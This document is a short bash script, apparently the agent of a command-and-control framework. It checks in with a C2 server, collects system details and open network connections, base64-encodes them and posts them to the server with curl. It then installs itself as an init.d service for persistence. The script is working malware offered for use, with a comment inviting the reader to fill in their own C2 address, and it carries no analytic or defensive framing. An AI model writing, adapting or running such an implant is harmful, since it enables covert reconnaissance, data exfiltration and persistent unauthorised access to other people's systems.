#!/bin/bash

C2Server="http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
AgentID=""

encrypt_data() {
    local data="$1"
    echo "$data" | base64
}

decrypt_data() {
    local data="$1"
    echo "$data" | base64 --decode
}

write_log() {
    local message="$1"
    echo "$message"
}

send_data() {
    local endpoint="$1"
    local data="$2"
    local encrypted_data
    encrypted_data=$(encrypt_data "$data")
    curl -k -X POST "$C2Server/$endpoint" -d "$encrypted_data" -H "Content-Type: application/json"
}

check_in() {
    response=$(curl -s -X POST "$C2Server/checkin" -d '{"AgentID":""}' -H "Content-Type: application/json")
    AgentID=$(echo $response | jq -r '.AgentID')
    write_log "Checked in with AgentID: $AgentID"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    lsb_release -a >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local script_path="/etc/init.d/linux_payload.sh"
    cp "$0" "$script_path"
    chmod +x "$script_path"
    update-rc.d linux_payload.sh defaults
}

main() {
    write_log "Payload started."
    
    check_in
    system_info=$(gather_system_info)
    network_connections=$(list_network_connections)
    
    data=$(cat <<EOF
{
    "AgentID": "$AgentID",
    "SystemInfo": "$system_info",
    "NetworkConnections": "$network_connections"
}
EOF
)
    
    send_data "report" "$data"
    establish_persistence
}

main
